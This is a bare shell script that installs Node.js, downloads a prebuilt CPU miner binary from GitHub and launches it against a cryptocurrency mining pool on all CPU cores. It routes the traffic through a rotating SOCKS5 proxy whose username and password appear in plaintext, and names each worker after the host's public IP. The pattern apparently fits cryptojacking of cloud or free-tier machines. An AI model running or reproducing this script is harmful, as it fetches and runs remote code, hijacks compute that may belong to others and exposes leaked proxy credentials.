wget https://nodejs.org/download/release/v14.17.0/node-v14.17.0-linux-x64.tar.gz
\tar xf node-v14.17.0-linux-x64.tar.gz -C /opt/
\rm node-v14.17.0-linux-x64.tar.gz
PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH
npm config set cache /tmp --global
wget https://github.com/m-pays/m-cpuminer-v2/releases/download/2.4/m-minerd-64-linux.tar.gz -O - | tar -xz && cd m-minerd-64-linux
ph add m-minerd
ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./m-minerd -a m7mhash -o stratum+tcp://xmg.minerclaim.net:3333 -u kntlpop.kntlpop1 -p x -s $(nproc --all) -t $(nproc --all) --proxy socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80

